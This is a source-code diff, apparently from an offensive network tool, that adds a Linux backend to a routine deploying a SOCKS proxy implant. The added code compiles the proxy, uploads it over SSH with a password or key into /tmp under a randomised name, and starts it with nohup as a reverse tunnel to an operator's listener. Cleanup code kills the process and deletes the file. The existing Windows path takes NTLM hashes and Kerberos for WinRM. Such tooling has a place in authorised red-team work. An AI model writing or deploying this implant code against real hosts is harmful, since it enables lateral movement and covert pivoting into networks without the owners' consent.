@@ -1,6 +1,7 @@
-import std/[strutils, os, osproc, random, times, net]
+import std/[strutils, os, osproc, random, times, net, base64, asyncdispatch]
 
 import ../winrm/client as winrm
+import ../ssh/client as sshclient
 import svc/socksctrl as socksctrl
 
 const socksSource = staticRead("svc/nimuxsocks.nim")
@@ -9,6 +10,8 @@ const crossFlags = " -d:mingw --cpu:amd64 --os:windows --threads:on --tlsEmulati
                    " --cc:gcc --gcc.exe:x86_64-w64-mingw32-gcc" &
                    " --gcc.linkerexe:x86_64-w64-mingw32-gcc --passL:-static" &
                    " --mm:arc"
+
+const linuxFlags = " --os:linux --threads:on --tlsEmulation:off -d:release --opt:size --mm:arc"
 
 type
   SocksDeployResult* = object
@@ -28,13 +31,25 @@ proc randomToken(): string =
     if c < 10: result.add chr(ord('0') + c)
     else: result.add chr(ord('a') + (c - 10))
 
-proc buildSocksProxyBinary*(): string =
+proc shQuote(s: string): string =
+  "'" & s.replace("'", "'\"'\"'") & "'"
+
+proc binaryTargetName(linuxBackend: bool): string =
+  if linuxBackend: "nimuxsocks"
+  else: "nimuxsocks.exe"
+
+proc helperRemoteName(token: string; linuxBackend: bool): string =
+  if linuxBackend: "nimproxy" & token
+  else: "nimproxy" & token & ".exe"
+
+proc buildSocksProxyBinary*(linuxBackend = false): string =
   let tmp = getTempDir() / "nimuxsocks_build_" & $getCurrentProcessId()
   createDir(tmp)
   try:
     writeFile(tmp / "nimuxsocks.nim", socksSource)
-    let exe = tmp / "nimuxsocks.exe"
-    let cmd = "nim --skipParentCfg:on c" & crossFlags & " --app:console" &
+    let exe = tmp / binaryTargetName(linuxBackend)
+    let buildFlags = if linuxBackend: linuxFlags else: crossFlags
+    let cmd = "nim --skipParentCfg:on c" & buildFlags & " --app:console" &
               " --threads:on" &
               " --nimcache:" & tmp / "cache" &
               " -o:" & exe & " " & tmp / "nimuxsocks.nim"
@@ -45,6 +60,52 @@ proc buildSocksProxyBinary*(): string =
   finally:
     removeDir(tmp)
 
+proc runLinuxSsh(username, password, sshKeyPath, host: string; port, timeoutMs: int;
+                 remoteCommand: string): tuple[ok: bool; output: string; message: string] =
+  if username.len == 0:
+    return (false, "", "Linux deployment requires --username")
+  let r =
+    if sshKeyPath.len > 0:
+      waitFor sshclient.sshExecKey(host, port, timeoutMs, username, sshKeyPath, remoteCommand)
+    else:
+      if password.len == 0:
+        return (false, "", "Linux deployment requires --password or --ssh-key")
+      waitFor sshclient.sshExec(host, port, timeoutMs, username, password, remoteCommand)
+  if not r.reachable:
+    return (false, r.output, "ssh connection failed")
+  if not r.authenticated:
+    return (false, r.output, if r.authMessage.len > 0: r.authMessage else: "ssh authentication failed")
+  if r.exitCode != 0:
+    let msg = if r.stderrOut.strip().len > 0: r.stderrOut.strip()
+              elif r.output.strip().len > 0: r.output.strip()
+              else: "remote command failed"
+    return (false, r.output, msg)
+  (true, r.output, "")
+
+proc runLinuxUpload(username, password, sshKeyPath, host: string; port, timeoutMs: int;
+                    remotePath: string; data: string): tuple[ok: bool; message: string] =
+  if username.len == 0:
+    return (false, "Linux deployment requires --username")
+  let payload = encode(data)
+  let command = "umask 077; base64 -d > " & shQuote(remotePath)
+  let r =
+    if sshKeyPath.len > 0:
+      waitFor sshclient.sshExecInputKey(host, port, timeoutMs, username, sshKeyPath, command, payload)
+    else:
+      if password.len == 0:
+        return (false, "Linux deployment requires --password or --ssh-key")
+      waitFor sshclient.sshExecInput(host, port, timeoutMs, username, password, command, payload)
+  if not r.reachable:
+    return (false, "ssh connection failed")
+  if not r.authenticated:
+    return (false, if r.authMessage.len > 0: r.authMessage else: "ssh authentication failed")
+  if r.exitCode != 0:
+    return (false,
+      if r.stderrOut.strip().len > 0: r.stderrOut.strip()
+      elif r.output.strip().len > 0: r.output.strip()
+      else: "remote upload failed")
+  (true, "")
+
 proc deploySocksProxy*(
   host: string; port, timeoutMs, socksPort: int;
   username, password, ntlmHash, domain: string;
@@ -54,7 +115,10 @@ proc deploySocksProxy*(
   kerberos = false;
   userProcess = false;
   reverseHost = "";
-  reversePort = 0
+  reversePort = 0;
+  linuxBackend = false;
+  sshKeyPath = "";
+  remotePathOverride = ""
 ): SocksDeployResult =
   result.host = host
   result.port = port
@@ -62,13 +126,58 @@ proc deploySocksProxy*(
 
   var exeBytes: string
   try:
-    exeBytes = buildSocksProxyBinary()
+    exeBytes = buildSocksProxyBinary(linuxBackend)
   except CatchableError as e:
     result.message = "compile failed: " & e.msg.splitLines()[0]
     return
 
   let token = randomToken()
-  let remoteName = "nimproxy" & token & ".exe"
+  let remoteName = helperRemoteName(token, linuxBackend)
+
+  if linuxBackend:
+    if not kerberos and username.len == 0:
+      result.message = "Linux deployment requires --username"
+      return
+    if reverseHost.len == 0 or reversePort <= 0:
+      result.message = "Linux deployment currently requires --reverse and --listener"
+      return
+
+    result.remotePath =
+      if remotePathOverride.len > 0: remotePathOverride
+      else: "/tmp/" & remoteName
+
+    let upload = runLinuxUpload(username, password, sshKeyPath, host, port, timeoutMs,
+      result.remotePath, exeBytes)
+    if not upload.ok:
+      result.message = "upload failed: " & upload.message
+      return
+
+    let verify = runLinuxSsh(username, password, sshKeyPath, host, port, timeoutMs,
+      "test -f " & shQuote(result.remotePath) & " && echo found || echo missing")
+    let verifyOut = verify.output.strip()
+    if not verify.ok or verifyOut != "found":
+      result.message = "uploaded file not found at " & result.remotePath &
+        (if verifyOut.len > 0: " (got: " & verifyOut & ")" else: "")
+      return
+
+    discard runLinuxSsh(username, password, sshKeyPath, host, port, timeoutMs,
+      "chmod +x " & shQuote(result.remotePath) & " ; pkill -f '[n]improxy' >/dev/null 2>&1 || true")
+
+    let args = "--reverse " & reverseHost & " --reverse-port " & $reversePort
+    let start = runLinuxSsh(username, password, sshKeyPath, host, port, timeoutMs,
+      "nohup " & shQuote(result.remotePath) & " " & args &
+      " >/dev/null 2>&1 & echo $!")
+    let startOut = start.output.strip()
+    if not start.ok or startOut.len == 0:
+      result.message = "start failed" &
+        (if startOut.len > 0: ": " & startOut else: "")
+      return
+
+    result.pid = startOut
+    result.taskName = ""
+    result.success = true
+    result.message = "socks5 proxy running via ssh"
+    return
 
   let authMethod = if kerberos: winrm.wamKerberos else: winrm.wamNtlm
 
@@ -191,8 +300,43 @@ proc killSocksProxy*(
   username, password, ntlmHash, domain: string;
   remotePath, pid, taskName: string;
   useSsl = false;
-  kerberos = false
+  kerberos = false;
+  linuxBackend = false;
+  sshKeyPath = ""
 ): tuple[ok: bool; message: string] =
+  if linuxBackend:
+    let marker = "__nimux_cleanup_ok__"
+    let helperName = if remotePath.len > 0: extractFilename(remotePath) else: ""
+    var cmd = ""
+    if pid.len > 0:
+      cmd.add "kill -9 " & shQuote(pid) & " >/dev/null 2>&1 || true"
+    elif helperName.len > 0:
+      cmd.add "pkill -x " & shQuote(helperName) & " >/dev/null 2>&1 || true"
+    else:
+      cmd.add "pkill -f '[n]improxy' >/dev/null 2>&1 || true"
+    if remotePath.len > 0:
+      cmd.add "; rm -f " & shQuote(remotePath) & " >/dev/null 2>&1 || true"
+    cmd.add "; printf " & shQuote(marker)
+
+    let r =
+      if sshKeyPath.len > 0:
+        waitFor sshclient.sshExecKey(host, port, timeoutMs, username, sshKeyPath, cmd)
+      else:
+        if password.len == 0:
+          return (false, "Linux deployment requires --password or --ssh-key")
+        waitFor sshclient.sshExec(host, port, timeoutMs, username, password, cmd)
+
+    if not r.reachable:
+      return (false, "ssh connection failed")
+    if not r.authenticated:
+      return (false, if r.authMessage.len > 0: r.authMessage else: "ssh authentication failed")
+    if marker in r.output:
+      return (true, "proxy stopped and removed")
+    return (false, if r.stderrOut.strip().len > 0: r.stderrOut.strip()
+                   elif r.output.strip().len > 0: r.output.strip()
+                   elif r.authMessage.len > 0: r.authMessage
+                   else: "ssh cleanup failed")
+
   let authMethod = if kerberos: winrm.wamKerberos else: winrm.wamNtlm
   var ps = ""
   if pid.len > 0:
